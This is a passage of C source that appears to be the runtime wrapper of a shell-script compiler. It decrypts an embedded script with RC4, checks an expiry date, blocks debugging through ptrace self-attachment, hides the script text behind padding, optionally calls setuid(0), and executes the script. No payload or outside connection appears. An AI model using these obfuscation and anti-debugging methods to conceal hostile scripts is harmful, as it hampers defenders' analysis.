        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
